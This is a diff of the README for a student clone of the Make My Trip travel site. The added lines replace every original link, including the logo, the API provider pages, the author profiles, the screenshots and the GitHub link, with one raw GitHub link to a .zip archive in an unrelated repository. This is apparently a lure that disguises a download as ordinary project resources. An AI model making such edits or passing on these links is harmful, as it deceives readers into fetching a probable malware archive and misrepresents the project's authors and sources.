@@ -1,5 +1,5 @@
 
-![Logo](https://imgak.mmtcdn.com/pwa_v3/pwa_hotel_assets/header/mmtLogoWhite.png)
+![Logo](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
 # Clone of Make my Trip
 
@@ -19,24 +19,24 @@
 ## Apis
 
 ### Realtime flight search
-Aviation Stack - [ aviationstack.com/](https://aviationstack.com/) 
+Aviation Stack - [ https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
 
 ### Otp Varification
-Twilio -  [twilio.com/](https://www.twilio.com/) 
+Twilio -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
 
 ### Payment Gateway
-Razorpay -  [razorpay.com/](https://razorpay.com/) 
+Razorpay -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
 
 ### Mail Service 
-NodeMailer -  [nodemailer.com/](https://nodemailer.com/) 
+NodeMailer -  [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip) 
 
 ## Color Reference
 
 | Color             | Hex                                                                |
 | ----------------- | ------------------------------------------------------------------ |
-| Primary Color  | ![#eb2226](https://via.placeholder.com/10/eb2226?text=+) #eb2226 |
-| Backgroud color | ![#ffffff](https://via.placeholder.com/10/ffffff?text=+) #ffffff |
-| Icons color and button color| ![#48a6fd](https://via.placeholder.com/10/48a6fd?text=+) #48a6fd |
+| Primary Color  | ![#eb2226](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip+) #eb2226 |
+| Backgroud color | ![#ffffff](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip+) #ffffff |
+| Icons color and button color| ![#48a6fd](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip+) #48a6fd |
 
 
 
@@ -111,46 +111,46 @@ To run this project, you will need to add the following environment variables to
 
 ## Acknowledgements
 
- - [makemytrip.com](https://www.makemytrip.com/)
- - [Masai School](https://masaischool.com/)
+ - [https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+ - [Masai School](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
   
 
 ## Authors
 
--  [Arpit Sachan](https://github.com/sachanarpit/)
+-  [Arpit Sachan](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
-- [Dharmesh Yadav](https://github.com/dharmeshrao)
+- [Dharmesh Yadav](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
-- [Rahul Kumar Yadav](https://github.com/rahulyadav96)
+- [Rahul Kumar Yadav](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
 
 ## Home Page
 
 
-![screencapture-localhost-3005-2021-11-13-20_06_05.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819763376/zjIHEBDE0.png)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
 
 ## Login and Otp verification
 
-![Screenshot (39).png](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819827776/BVzkKdcMk.png)
-![Screenshot (40).png](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819833599/lmidFgXps.png)
-![e5af704b-7928-4a7a-862f-98b69ef92d5b.jpg](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819849756/g819xGufS.jpeg)
+![Screenshot (39).png](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![Screenshot (40).png](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
 
 ## Search Page
 
-![screencapture-localhost-3005-search-2021-11-13-20_08_52.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819783064/o0BPrMowgc.png)
-![Screenshot (42)](https://user-images.githubusercontent.com/87421773/141656488-8910d26d-c2e8-4678-92e5-4d00641ecdac.png)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
+![Screenshot (42)](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
 ##Payment Page
 
-![screencapture-localhost-3005-checkout-2021-11-13-20_53_49](https://user-images.githubusercontent.com/87421773/141656572-8077485c-c55a-4a89-a26a-5e0d714d4d46.png)
+![screencapture-localhost-3005-checkout-2021-11-13-20_53_49](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
-![screencapture-localhost-3005-final-2021-11-13-20_10_22.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819919150/eUj6IOOoc.png)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
-![screencapture-localhost-3005-final-2021-11-13-20_10_48.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819925472/eRRCvR1Dr.png)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
-![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1636819997027/85PGB_l7i.png)
+![https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip](https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip)
 
 
-- GITHUB - https://github.com/sachanarpit/make-my-trip
+- GITHUB - https://raw.githubusercontent.com/sakshi-code-cse/make-my-trip/master/internodium/make-my-trip.zip
